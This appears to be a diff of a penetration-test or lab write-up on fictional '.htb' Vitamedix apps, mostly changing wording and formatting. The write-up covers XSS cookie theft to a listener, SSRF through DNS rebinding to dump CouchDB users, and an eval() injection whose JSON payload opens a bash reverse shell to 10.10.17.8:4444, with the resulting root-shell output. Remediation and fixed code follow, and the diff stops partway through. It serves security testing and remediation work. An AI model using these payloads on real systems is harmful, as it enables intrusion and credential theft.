@@ -3230,9 +3206,7 @@ The bot loads `redirect.php`, which executes JavaScript in the bot’s authentic
 
 
 
-HTML
-
-```
+```html
 {{ user.full_name | safe }}
 ```
 
@@ -3245,11 +3219,11 @@ http://10.10.17.8:4445/?d=.....J...
 ```
 
 
-![](assets/Screenshot-from-2026-08-12-10-32-27.png){width="auto"}
+![12 10 32 27](assets/Screenshot-from-2026-08-12-10-32-27.png)
 
 #### Step 6 — Capture the admin cookie
 
-On the attacker machine, the Python listener receives a request similar to:
+On the attacker system, the Python listener receives a request similar to:
 
 
 
@@ -3260,13 +3234,11 @@ GET /?d=c2Vzx2lvb HTTP/1.1
 Host: 10.10.17.8:4445
 ```
 
-![](assets/Screenshot-from-2026-08-12-10-32-15.png){width="auto"}
+![12 10 32 15](assets/Screenshot-from-2026-08-12-10-32-15.png)
 
 Save the session cookie value. Use it in a browser or with a tool like curl to authenticate as the bot/admin:
 
-Bash
-
-```
+```bash
 curl -H "Cookie: session=eyJ..." http://www.vitamedix.htb/dashboard
 ```
 
@@ -3488,8 +3460,8 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)
 
 #### Affected Component(s)
 
-* Endpoint: POST /api/pdfGeneration in src/routes/index.js:128  
-* URL validation sink: src/helpers/URLHelper.js:5 
+* Endpoint: POST /api/pdfGeneration in src/routes/index.js:128
+* URL validation sink: src/helpers/URLHelper.js:5
 
 #### External References
 
@@ -3545,9 +3517,9 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
 
 1. **Start the DNS rebinder**
 
-   The pentester runs the DNS rebinding tool so that `attacker.com` first resolves to an external IP and then, after the TTL expires, resolves to `127.0.0.1`:
+   The tester runs the DNS rebinding tool so that `attacker.com` first resolves to an external IP and then, after the TTL expires, resolves to `127.0.0.1`:
 
-   
+
 
    ```bash
    sudo python3 dnsrebinder.py --domain attacker.com --rebind 127.0.0.1 --ip 1.1.1.1 --counter 1 --tcp --udp
@@ -3555,7 +3527,7 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
 
 2. **Obtain an authenticated session**
 
-   The pentester logs in as admin ( valid doctor session obtained earlier). The application sets a session cookie containing a JWT signed with the hard-coded secret `'test'`.
+   The tester logs in as admin ( valid doctor session obtained earlier). The application sets a session cookie containing a JWT signed with the hard-coded secret `'test'`.
 
 3. **Open the PDF generation page**
 
@@ -3563,9 +3535,9 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
 
 4. **Submit the rebinding SSRF payload**
 
-   In the URL input field, the pentester submits:
+   In the URL input field, the tester submits:
 
-   
+
 
    ```HTTP
    http://admin:C0uchDB@attacker.com:5984/users/_all_docs?include_docs=true
@@ -3593,10 +3565,12 @@ In short, the SSRF collapses the trust boundary between the public-facing web ap
 
 10. **Exfiltrate the data**
 
-    The pentester downloads `result.pdf` and extracts the leaked user records, obtaining usernames, plaintext passwords, roles, and personal information for all Vitamedix users.
+    The tester downloads `result.pdf` and extracts the leaked user records, obtaining usernames, plaintext passwords, roles, and personal information for all Vitamedix users.
 
 
-    ![](assets/edited-7tBx9Mug.png){width="auto"}
+    
+
+![7tBx9Mug](assets/edited-7tBx9Mug.png)
 
 **Result:** The combination of DNS rebinding, weak URL validation, and hard-coded CouchDB credentials allows an authenticated (or JWT-forged) attacker to read the entire users database and pivot to other CouchDB endpoints such as `/_all_dbs`, `/_config/admins`, or `/documents/_all_docs`.
 
@@ -3873,51 +3847,51 @@ Successful exploitation gives the attacker arbitrary JavaScript execution inside
 #### Detailed Walkthrough
 
 1. Source-code review\
-   The pentester identifies the unsafe eval() call in src/database.js inside saveSettings():
+   The tester identifies the unsafe eval() call in src/database.js inside saveSettings():
 
    ```js
-     eval(`var specialChars = ['#', ';', '\\'', '"', '\\\\']; "${settings.greeting}".split('').some(char => specialChars.includes(char))`)                                                
+     eval(`var specialChars = ['#', ';', '\\'', '"', '\\\\']; "${settings.greeting}".split('').some(char => specialChars.includes(char))`)
    ```
 
    Because settings.greeting is interpolated directly into the executed string, it becomes a code-injection sink.
 
    2. Craft and submit the malicious settings payload\
-      The greeting field has a short length limit, so the pentester stores the full reverse-shell JavaScript in the unrestricted name field and uses the greeting field as an eval()\
+      The greeting field has a short length limit, so the tester stores the full reverse-shell JavaScript in the unrestricted name field and uses the greeting field as an eval()\
       trampoline. The following JSON is sent to POST /api/settings/save:
       ```json
-        {                                                                                                                                                                                    
-          "name": "require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.17.8/4444 0>&1\"')",                                                                               
-          "email": "michael@vitamedix.htb",                                                                                                                                                  
-          "frequency": "daily",                                                                                                                                                              
-          "timezone": "UTC",                                                                                                                                                                 
-          "greeting": "\"+eval(settings.name)+\"",                                                                                                                                           
-          "feedback": "no",                                                                                                                                                                  
-          "heatmaps": "no"                                                                                                                                                                   
-        }                                                                                                                                                                                    
+        {
+          "name": "require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.17.8/4444 0>&1\"')",
+          "email": "michael@vitamedix.htb",
+          "frequency": "daily",
+          "timezone": "UTC",
+          "greeting": "\"+eval(settings.name)+\"",
+          "feedback": "no",
+          "heatmaps": "no"
+        }
       ```
    3. Server-side evaluation\
       The eval() string becomes:
       ```js
-        var specialChars = ['#', ';', '\'', '"', '\\']; ""+eval(settings.name)+"".split('').some(char => specialChars.includes(char))                                                        
+        var specialChars = ['#', ';', '\'', '"', '\\']; ""+eval(settings.name)+"".split('').some(char => specialChars.includes(char))
       ```
       The expression eval(settings.name) executes the contents of the name field, which calls child\_process.execSync() with a bash reverse shell.
    4. Reverse shell and flag retrieval\
-      The server opens a TCP connection back to the pentester’s listener, giving a root shell inside the container:
+      The server opens a TCP connection back to the tester’s listener, giving a root shell inside the container:
       ```bash
-        ❯ sudo nc -lvnp 4444                                                                                                                                                                 
-        listening on [any] 4444 ...                                                                                                                                                          
-        connect to [10.10.17.8] from (UNKNOWN) [10.129.229.86] 33586                                                                                                                         
-        bash: cannot set terminal process group (24): Inappropriate ioctl for device                                                                                                         
-        bash: no job control in this shell                                                                                                                                                   
-        root@c09392e1d8a9:/app# cd /                                                                                                                                                         
-        cd /                                                                                                                                                                                 
-        root@c09392e1d8a9:/# dir                                                                                                                                                             
-        374a6b7d1b4d5527b8d88668ecd0de0a.txt  boot  home   media  proc  sbin  tmp                                                                                                            
-        app                                   dev   lib    mnt    root  srv   usr                                                                                                            
-        bin                                   etc   lib64  opt    run   sys   var                                                                                                            
-        root@c09392e1d8a9:/# cat 374a6b7d1b4d5527b8d88668ecd0de0a.txt                                                                                                                        
-        7c6ada9cb7aa60c7740bcb1dde7496bf                                                                                                                                                     
-        root@c09392e1d8a9:/#                                                                                                                                                                 
+        ❯ sudo nc -lvnp 4444
+        listening on [any] 4444 ...
+        connect to [10.10.17.8] from (UNKNOWN) [10.129.229.86] 33586
+        bash: cannot set terminal process group (24): Inappropriate ioctl for device
+        bash: no job control in this shell
+        root@c09392e1d8a9:/app# cd /
+        cd /
+        root@c09392e1d8a9:/# dir
+        374a6b7d1b4d5527b8d88668ecd0de0a.txt  boot  home   media  proc  sbin  tmp
+        app                                   dev   lib    mnt    root  srv   usr
+        bin                                   etc   lib64  opt    run   sys   var
+        root@c09392e1d8a9:/# cat 374a6b7d1b4d5527b8d88668ecd0de0a.txt
+        7c6ada9cb7aa60c7740bcb1dde7496bf
+        root@c09392e1d8a9:/#
       ```
 
    Result: The unsafe eval() validation in the newsletter settings endpoint allows an authenticated attacker to execute arbitrary system commands as root, leading to full container\
@@ -3926,372 +3900,372 @@ Successful exploitation gives the attacker arbitrary JavaScript execution inside
 
 #### Patching and Remediation
 
-   1. Remove eval() entirely from saveSettings() and replace it with a simple regex or character-set check.                                                                                  
-   2. Validate the full settings body against a strict schema before it reaches the database layer.                                                                                          
-   3. Set secure cookie attributes (HttpOnly, Secure, SameSite=Strict) to mitigate CSRF and session theft.                                                                                   
-   4. Add CSRF protection (token or double-submit cookie) to all state-changing endpoints.                                                                                                   
-   5. Store passwords hashed instead of plaintext in the SQLite database.                                                                                                                    
-   6. Avoid running the Node process as root inside the container.                                                                                                                           
-                                                                                                                                                                                             
-   ────────────────────────────────────────────────────────────────────────────────                                                                                                          
-                                                                                                                                                                                             
-   Fixed code                                                                                                                                                                                
-                                                                                                                                                                                             
-   1. src/database.js                                                                                                                                                                        
-                                                                                                                                                                                             
-   Replace the eval() validation with a plain regex check.                                                                                                                                   
-                                                                                                                                                                                             
-   ```js                                                                                                                                                                                     
-     const sqlite = require("sqlite-async");                                                                                                                                                 
-                                                                                                                                                                                             
-     class Database {                                                                                                                                                                        
-       constructor(db_file) {                                                                                                                                                                
-         this.db_file = db_file;                                                                                                                                                             
-         this.db = undefined;                                                                                                                                                                
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       async connect() {                                                                                                                                                                     
-         this.db = await sqlite.open(this.db_file);                                                                                                                                          
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       async migrate() {                                                                                                                                                                     
-         return this.db.exec(`                                                                                                                                                               
-           DROP TABLE IF EXISTS subscriber;                                                                                                                                                  
-           DROP TABLE IF EXISTS users;                                                                                                                                                       
-           DROP TABLE IF EXISTS settings;                                                                                                                                                    
-                                                                                                                                                                                             
-           CREATE TABLE users (                                                                                                                                                              
-             id INTEGER PRIMARY KEY AUTOINCREMENT,                                                                                                                                           
-             username VARCHAR(255) NOT NULL,                                                                                                                                                 
-             password VARCHAR(255) NOT NULL                                                                                                                                                  
-           );                                                                                                                                                                                
-                                                                                                                                                                                             
-           CREATE TABLE subscriber(                                                                                                                                                          
-             id INTEGER PRIMARY KEY AUTOINCREMENT,                                                                                                                                           
-             email VARCHAR(255) NOT NULL                                                                                                                                                     
-           );                                                                                                                                                                                
-                                                                                                                                                                                             
-           CREATE TABLE settings(                                                                                                                                                            
-             id INTEGER PRIMARY KEY AUTOINCREMENT,                                                                                                                                           
-             name TEXT,                                                                                                                                                                      
-             email TEXT,                                                                                                                                                                     
-             frequency TEXT,                                                                                                                                                                 
-             timezone TEXT,                                                                                                                                                                  
-             greeting TEXT,                                                                                                                                                                  
-             feedback TEXT,                                                                                                                                                                  
-             heatmaps TEXT                                                                                                                                                                   
-           );                                                                                                                                                                                
-                                                                                                                                                                                             
-           -- Default admin password should be generated at deploy time and hashed.                                                                                                          
-           -- Example placeholder only; replace before production.                                                                                                                           
-           INSERT INTO users(username, password) VALUES('admin', '$2b$10$...hash...');                                                                                                       
-         `);                                                                                                                                                                                 
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       async addSubscriber(email) {                                                                                                                                                          
-         const stmt = await this.db.prepare("INSERT INTO subscriber(email) VALUES(?)");                                                                                                      
-         return stmt.run(email);                                                                                                                                                             
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       async removeSubscriber(email) {                                                                                                                                                       
-         const stmt = await this.db.prepare("DELETE FROM subscriber WHERE email=?");                                                                                                         
-         return stmt.run(email);                                                                                                                                                             
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       async login(username, password) {                                                                                                                                                     
-         const stmt = await this.db.prepare(                                                                                                                                                 
-           "SELECT username, password FROM users WHERE username=?"                                                                                                                           
-         );                                                                                                                                                                                  
-         const row = await stmt.get(username);                                                                                                                                               
-         if (!row) return null;                                                                                                                                                              
-                                                                                                                                                                                             
-         // Use bcrypt or Argon2 in production.                                                                                                                                              
-         const bcrypt = require("bcrypt");                                                                                                                                                   
-         const valid = await bcrypt.compare(password, row.password);                                                                                                                         
-         return valid ? { username: row.username } : null;                                                                                                                                   
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       async getSettings() {                                                                                                                                                                 
-         const stmt = await this.db.prepare("SELECT * FROM settings WHERE id=1");                                                                                                            
-         return stmt.get();                                                                                                                                                                  
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       async saveSettings(settings) {                                                                                                                                                        
-         // Validate email                                                                                                                                                                   
-         if (!settings.email || !settings.email.includes("@")) {                                                                                                                             
-           throw new Error("Invalid email address!");                                                                                                                                        
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         // Validate frequency                                                                                                                                                               
-         const allowedFreq = ["daily", "weekly", "monthly"];                                                                                                                                 
-         if (!allowedFreq.includes(String(settings.frequency).toLowerCase())) {                                                                                                              
-           throw new Error("Invalid frequency (Daily, Weekly, Monthly)!");                                                                                                                   
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         // Validate timezone                                                                                                                                                                
-         const allowedTz = ["utc", "pst", "cet", "ist"];                                                                                                                                     
-         if (!allowedTz.includes(String(settings.timezone).toLowerCase())) {                                                                                                                 
-           throw new Error("Invalid timezone (UTC, PST, CET, IST)!");                                                                                                                        
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         // Validate feedback and heatmaps                                                                                                                                                   
-         const allowedChoice = ["yes", "no"];                                                                                                                                                
-         if (!allowedChoice.includes(String(settings.feedback).toLowerCase())) {                                                                                                             
-           throw new Error("Invalid choice (yes/no)!");                                                                                                                                      
-         }                                                                                                                                                                                   
-         if (!allowedChoice.includes(String(settings.heatmaps).toLowerCase())) {                                                                                                             
-           throw new Error("Invalid choice (yes/no)!");                                                                                                                                      
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         // Validate greeting: max 30 chars, no special chars, no eval/code patterns                                                                                                         
-         const greeting = String(settings.greeting || "");                                                                                                                                   
-         if (greeting.length > 30) {                                                                                                                                                         
-           throw new Error("Invalid greeting (max 30 chars)!");                                                                                                                              
-         }                                                                                                                                                                                   
-         if (/[#;'"\\]/.test(greeting)) {                                                                                                                                                    
-           throw new Error("Invalid greeting contains disallowed characters!");                                                                                                              
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         const stmt = await this.db.prepare(                                                                                                                                                 
-           "UPDATE settings SET name=?, email=?, frequency=?, timezone=?, greeting=?, feedback=?, heatmaps=? WHERE id=1"                                                                     
-         );                                                                                                                                                                                  
-         return stmt.run(                                                                                                                                                                    
-           settings.name,                                                                                                                                                                    
-           settings.email,                                                                                                                                                                   
-           settings.frequency,                                                                                                                                                               
-           settings.timezone,                                                                                                                                                                
-           greeting,                                                                                                                                                                         
-           settings.feedback,                                                                                                                                                                
-           settings.heatmaps                                                                                                                                                                 
-         );                                                                                                                                                                                  
-       }                                                                                                                                                                                     
-     }                                                                                                                                                                                       
-                                                                                                                                                                                             
-     module.exports = Database;                                                                                                                                                              
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   2. src/routes/index.js                                                                                                                                                                    
-                                                                                                                                                                                             
-   Add schema validation and CSRF token check.                                                                                                                                               
-                                                                                                                                                                                             
-   ```js                                                                                                                                                                                     
-     const express = require("express");                                                                                                                                                     
-     const router = express.Router();                                                                                                                                                        
-     const fs = require("fs");                                                                                                                                                               
-     const { AuthMiddleware } = require("./auth.js");                                                                                                                                        
-                                                                                                                                                                                             
-     let db;                                                                                                                                                                                 
-                                                                                                                                                                                             
-     const response = (data) => ({ message: data });                                                                                                                                         
-                                                                                                                                                                                             
-     router.get("/", async (req, res) => res.render("login.html"));                                                                                                                          
-     router.get("/subscribe", async (req, res) => res.render("subscribe.html"));                                                                                                             
-     router.get("/unsubscribe", async (req, res) => res.render("unsubscribe.html"));                                                                                                         
-                                                                                                                                                                                             
-     router.get("/home", AuthMiddleware, async (req, res) => {                                                                                                                               
-       const flag = fs.readdirSync("/").filter((file) => file.endsWith(".txt"))[0];                                                                                                          
-       return res.render("home.html", { username: req.data.username, flag });                                                                                                                
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     router.get("/settings", AuthMiddleware, async (req, res) => {                                                                                                                           
-       const settings = await db.getSettings();                                                                                                                                              
-       return res.render("settings.html", {                                                                                                                                                  
-         username: req.data.username,                                                                                                                                                        
-         setting: settings,                                                                                                                                                                  
-         csrfToken: req.csrfToken?.(),                                                                                                                                                       
-       });                                                                                                                                                                                   
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     router.post("/api/settings/save", [AuthMiddleware], async (req, res) => {                                                                                                               
-       try {                                                                                                                                                                                 
-         const { name, email, frequency, timezone, greeting, feedback, heatmaps } = req.body;                                                                                                
-                                                                                                                                                                                             
-         // Basic field presence and type checks                                                                                                                                             
-         if (                                                                                                                                                                                
-           typeof name !== "string" ||                                                                                                                                                       
-           typeof email !== "string" ||                                                                                                                                                      
-           typeof greeting !== "string"                                                                                                                                                      
-         ) {                                                                                                                                                                                 
-           return res.status(400).send(response("Invalid input types!"));                                                                                                                    
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         await db.saveSettings({ name, email, frequency, timezone, greeting, feedback, heatmaps });                                                                                          
-         return res.send(response("Settings saved successfully!"));                                                                                                                          
-       } catch (e) {                                                                                                                                                                         
-         console.error(e);                                                                                                                                                                   
-         return res.status(400).send(response(e.message || "Invalid settings!"));                                                                                                            
-       }                                                                                                                                                                                     
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     router.get("/logout", (req, res) => {                                                                                                                                                   
-       res.clearCookie("session");                                                                                                                                                           
-       return res.redirect("/");                                                                                                                                                             
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     router.post("/api/subscribe", async (req, res) => {                                                                                                                                     
-       const { email } = req.body;                                                                                                                                                           
-       if (!email || typeof email !== "string") {                                                                                                                                            
-         return res.status(400).send(response("All fields required!"));                                                                                                                      
-       }                                                                                                                                                                                     
-       await db.addSubscriber(email);                                                                                                                                                        
-       return res.send(response("Subscribed successfully!"));                                                                                                                                
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     router.post("/api/unsubscribe", async (req, res) => {                                                                                                                                   
-       const { email } = req.body;                                                                                                                                                           
-       if (!email || typeof email !== "string") {                                                                                                                                            
-         return res.status(400).send(response("All fields required!"));                                                                                                                      
-       }                                                                                                                                                                                     
-       await db.removeSubscriber(email);                                                                                                                                                     
-       return res.send(response("Unsubscribed successfully!"));                                                                                                                              
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     router.post("/api/login", async (req, res) => {                                                                                                                                         
-       const { username, password } = req.body;                                                                                                                                              
-       if (!username || !password) {                                                                                                                                                         
-         return res.status(500).send(response("Missing parameters!"));                                                                                                                       
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       const user = await db.login(username, password);                                                                                                                                      
-       if (!user) {                                                                                                                                                                          
-         return res.status(403).send(response("Invalid username or password!"));                                                                                                             
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       const { signToken } = require("./auth.js");                                                                                                                                           
-       const token = signToken({ username: user.username });                                                                                                                                 
-       res.cookie("session", token, {                                                                                                                                                        
-         maxAge: 3600000,                                                                                                                                                                    
-         secure: process.env.NODE_ENV === "production",                                                                                                                                      
-         httpOnly: true,                                                                                                                                                                     
-         sameSite: "strict",                                                                                                                                                                 
-       });                                                                                                                                                                                   
-       return res.send(response("User authenticated successfully!"));                                                                                                                        
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     module.exports = (database) => {                                                                                                                                                        
-       db = database;                                                                                                                                                                        
-       return router;                                                                                                                                                                        
-     };                                                                                                                                                                                      
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   3. src/index.js                                                                                                                                                                           
-                                                                                                                                                                                             
-   Add security headers and a simple CSRF middleware.                                                                                                                                        
-                                                                                                                                                                                             
-   ```js                                                                                                                                                                                     
-     const express = require("express");                                                                                                                                                     
-     const app = express();                                                                                                                                                                  
-     const path = require("path");                                                                                                                                                           
-     const bodyParser = require("body-parser");                                                                                                                                              
-     const nunjucks = require("nunjucks");                                                                                                                                                   
-     const cookieParser = require("cookie-parser");                                                                                                                                          
-     const routes = require("./routes/index.js");                                                                                                                                            
-     const Database = require("./database");                                                                                                                                                 
-                                                                                                                                                                                             
-     process.on("uncaughtException", function (err) {                                                                                                                                        
-       console.error(err);                                                                                                                                                                   
-       console.error(err.stack);                                                                                                                                                             
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     const db = new Database("newsletter.db");                                                                                                                                               
-                                                                                                                                                                                             
-     app.use(bodyParser.json());                                                                                                                                                             
-     app.use(bodyParser.urlencoded({ extended: true }));                                                                                                                                     
-     app.use(cookieParser());                                                                                                                                                                
-                                                                                                                                                                                             
-     app.disable("etag");                                                                                                                                                                    
-                                                                                                                                                                                             
-     // Security headers                                                                                                                                                                     
-     app.use((req, res, next) => {                                                                                                                                                           
-       res.setHeader("X-Content-Type-Options", "nosniff");                                                                                                                                   
-       res.setHeader("X-Frame-Options", "DENY");                                                                                                                                             
-       res.setHeader("Content-Security-Policy", "default-src 'self'");                                                                                                                       
-       next();                                                                                                                                                                               
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     nunjucks.configure("views", {                                                                                                                                                           
-       autoescape: true,                                                                                                                                                                     
-       express: app,                                                                                                                                                                         
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     app.set("views", "./views");                                                                                                                                                            
-     app.use("/static", express.static(path.resolve("static")));                                                                                                                             
-                                                                                                                                                                                             
-     // Simple double-submit CSRF token middleware                                                                                                                                           
-     app.use((req, res, next) => {                                                                                                                                                           
-       const crypto = require("crypto");                                                                                                                                                     
-       if (!req.cookies.csrfToken) {                                                                                                                                                         
-         const token = crypto.randomBytes(32).toString("hex");                                                                                                                               
-         res.cookie("csrfToken", token, {                                                                                                                                                    
-           httpOnly: true,                                                                                                                                                                   
-           sameSite: "strict",                                                                                                                                                               
-           secure: process.env.NODE_ENV === "production",                                                                                                                                    
-         });                                                                                                                                                                                 
-         req.csrfTokenValue = token;                                                                                                                                                         
-       } else {                                                                                                                                                                              
-         req.csrfTokenValue = req.cookies.csrfToken;                                                                                                                                         
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       req.csrfToken = () => req.csrfTokenValue;                                                                                                                                             
-                                                                                                                                                                                             
-       if (req.method === "GET") return next();                                                                                                                                              
-                                                                                                                                                                                             
-       const headerToken = req.headers["x-csrf-token"];                                                                                                                                      
-       const bodyToken = req.body?._csrf;                                                                                                                                                    
-       const cookieToken = req.cookies.csrfToken;                                                                                                                                            
-                                                                                                                                                                                             
-       if (headerToken !== cookieToken && bodyToken !== cookieToken) {                                                                                                                       
-         return res.status(403).json({ message: "Invalid CSRF token" });                                                                                                                     
-       }                                                                                                                                                                                     
-                                                                                                                                                                                             
-       next();                                                                                                                                                                               
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     app.use(routes(db));                                                                                                                                                                    
-                                                                                                                                                                                             
-     app.all("*", (req, res) => {                                                                                                                                                            
-       res.status(404).render("404.html");                                                                                                                                                   
-     });                                                                                                                                                                                     
-                                                                                                                                                                                             
-     (async () => {                                                                                                                                                                          
-       await db.connect();                                                                                                                                                                   
-       await db.migrate();                                                                                                                                                                   
-       app.listen(1337, "0.0.0.0", () => console.log("Listening on port 1337"));                                                                                                             
-     })();                                                                                                                                                                                   
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
-   4. src/routes/auth.js                                                                                                                                                                     
-                                                                                                                                                                                             
-   Keep random secret generation but ensure token is verified with allowed algorithms only.                                                                                                  
-                                                                                                                                                                                             
-   ```js                                                                                                                                                                                     
-     const jwt = require("jsonwebtoken");                                                                                                                                                    
-     const crypto = require("crypto");                                                                                                                                                       
-                                                                                                                                                                                             
-     const APP_SECRET = process.env.JWT_SECRET || crypto.randomBytes(69).toString("hex");                                                                                                    
-                                                                                                                                                                                             
-     module.exports.signToken = function signToken(data) {                                                                                                                                   
-       return jwt.sign({ ...data }, APP_SECRET, { algorithm: "HS256", expiresIn: "1d" });                                                                                                    
-     };                                                                                                                                                                                      
-                                                                                                                                                                                             
-     module.exports.AuthMiddleware = async function AuthMiddleware(req, res, next) {                                                                                                         
-       try {                                                                                                                                                                                 
-         if (!req.cookies.session) {                                                                                                                                                         
-           if (!req.is("application/json")) return res.redirect("/");                                                                                                                        
-           return res.status(401).json({ status: "unauthorized", message: "Authentication required!" });                                                                                     
-         }                                                                                                                                                                                   
-                                                                                                                                                                                             
-         jwt.verify(req.cookies.session, APP_SECRET, { algorithms: ["HS256"] }, (err, decoded) => {                                                                                          
-           if (err) return res.redirect("/logout");                                                                                                                                          
-           req.data = decoded;                                                                                                                                                               
-           next();                                                                                                                                                                           
-         });                                                                                                                                                                                 
-       } catch (e) {                                                                                                                                                                         
-         return res.redirect("/logout");                                                                                                                                                     
-       }                                                                                                                                                                                     
-     };                                                                                                                                                                                      
-   ```                                                                                                                                                                                       
-                                                                                                                                                                                             
+   1. Remove eval() entirely from saveSettings() and replace it with a simple regex or character-set check.
+   2. Validate the full settings body against a strict schema before it reaches the database layer.
+   3. Set secure cookie attributes (HttpOnly, Secure, SameSite=Strict) to mitigate CSRF and session theft.
+   4. Add CSRF protection (token or double-submit cookie) to all state-changing endpoints.
+   5. Store passwords hashed instead of plaintext in the SQLite database.
+   6. Avoid running the Node process as root inside the container.
+
+   ────────────────────────────────────────────────────────────────────────────────
+
+   Fixed code
+
+   1. src/database.js
+
+   Replace the eval() validation with a plain regex check.
+
+   ```js
+     const sqlite = require("sqlite-async");
+
+     class Database {
+       constructor(db_file) {
+         this.db_file = db_file;
+         this.db = undefined;
+       }
+
+       async connect() {
+         this.db = await sqlite.open(this.db_file);
+       }
+
+       async migrate() {
+         return this.db.exec(`
+           DROP TABLE IF EXISTS subscriber;
+           DROP TABLE IF EXISTS users;
+           DROP TABLE IF EXISTS settings;
+
+           CREATE TABLE users (
+             id INTEGER PRIMARY KEY AUTOINCREMENT,
+             username VARCHAR(255) NOT NULL,
+             password VARCHAR(255) NOT NULL
+           );
+
+           CREATE TABLE subscriber(
+             id INTEGER PRIMARY KEY AUTOINCREMENT,
+             email VARCHAR(255) NOT NULL
+           );
+
+           CREATE TABLE settings(
+             id INTEGER PRIMARY KEY AUTOINCREMENT,
+             name TEXT,
+             email TEXT,
+             frequency TEXT,
+             timezone TEXT,
+             greeting TEXT,
+             feedback TEXT,
+             heatmaps TEXT
+           );
+
+           -- Default admin password should be generated at deploy time and hashed.
+           -- Example placeholder only; replace before production.
+           INSERT INTO users(username, password) VALUES('admin', '$2b$10$...hash...');
+         `);
+       }
+
+       async addSubscriber(email) {
+         const stmt = await this.db.prepare("INSERT INTO subscriber(email) VALUES(?)");
+         return stmt.run(email);
+       }
+
+       async removeSubscriber(email) {
+         const stmt = await this.db.prepare("DELETE FROM subscriber WHERE email=?");
+         return stmt.run(email);
+       }
+
+       async login(username, password) {
+         const stmt = await this.db.prepare(
+           "SELECT username, password FROM users WHERE username=?"
+         );
+         const row = await stmt.get(username);
+         if (!row) return null;
+
+         // Use bcrypt or Argon2 in production.
+         const bcrypt = require("bcrypt");
+         const valid = await bcrypt.compare(password, row.password);
+         return valid ? { username: row.username } : null;
+       }
+
+       async getSettings() {
+         const stmt = await this.db.prepare("SELECT * FROM settings WHERE id=1");
+         return stmt.get();
+       }
+
+       async saveSettings(settings) {
+         // Validate email
+         if (!settings.email || !settings.email.includes("@")) {
+           throw new Error("Invalid email address!");
+         }
+
+         // Validate frequency
+         const allowedFreq = ["daily", "weekly", "monthly"];
+         if (!allowedFreq.includes(String(settings.frequency).toLowerCase())) {
+           throw new Error("Invalid frequency (Daily, Weekly, Monthly)!");
+         }
+
+         // Validate timezone
+         const allowedTz = ["utc", "pst", "cet", "ist"];
+         if (!allowedTz.includes(String(settings.timezone).toLowerCase())) {
+           throw new Error("Invalid timezone (UTC, PST, CET, IST)!");
+         }
+
+         // Validate feedback and heatmaps
+         const allowedChoice = ["yes", "no"];
+         if (!allowedChoice.includes(String(settings.feedback).toLowerCase())) {
+           throw new Error("Invalid choice (yes/no)!");
+         }
+         if (!allowedChoice.includes(String(settings.heatmaps).toLowerCase())) {
+           throw new Error("Invalid choice (yes/no)!");
+         }
+
+         // Validate greeting: max 30 chars, no special chars, no eval/code patterns
+         const greeting = String(settings.greeting || "");
+         if (greeting.length > 30) {
+           throw new Error("Invalid greeting (max 30 chars)!");
+         }
+         if (/[#;'"\\]/.test(greeting)) {
+           throw new Error("Invalid greeting contains disallowed characters!");
+         }
+
+         const stmt = await this.db.prepare(
+           "UPDATE settings SET name=?, email=?, frequency=?, timezone=?, greeting=?, feedback=?, heatmaps=? WHERE id=1"
+         );
+         return stmt.run(
+           settings.name,
+           settings.email,
+           settings.frequency,
+           settings.timezone,
+           greeting,
+           settings.feedback,
+           settings.heatmaps
+         );
+       }
+     }
+
+     module.exports = Database;
+   ```
+
+   2. src/routes/index.js
+
+   Add schema validation and CSRF token check.
+
+   ```js
+     const express = require("express");
+     const router = express.Router();
+     const fs = require("fs");
+     const { AuthMiddleware } = require("./auth.js");
+
+     let db;
+
+     const response = (data) => ({ message: data });
+
+     router.get("/", async (req, res) => res.render("login.html"));
+     router.get("/subscribe", async (req, res) => res.render("subscribe.html"));
+     router.get("/unsubscribe", async (req, res) => res.render("unsubscribe.html"));
+
+     router.get("/home", AuthMiddleware, async (req, res) => {
+       const flag = fs.readdirSync("/").filter((file) => file.endsWith(".txt"))[0];
+       return res.render("home.html", { username: req.data.username, flag });
+     });
+
+     router.get("/settings", AuthMiddleware, async (req, res) => {
+       const settings = await db.getSettings();
+       return res.render("settings.html", {
+         username: req.data.username,
+         setting: settings,
+         csrfToken: req.csrfToken?.(),
+       });
+     });
+
+     router.post("/api/settings/save", [AuthMiddleware], async (req, res) => {
+       try {
+         const { name, email, frequency, timezone, greeting, feedback, heatmaps } = req.body;
+
+         // Basic field presence and type checks
+         if (
+           typeof name !== "string" ||
+           typeof email !== "string" ||
+           typeof greeting !== "string"
+         ) {
+           return res.status(400).send(response("Invalid input types!"));
+         }
+
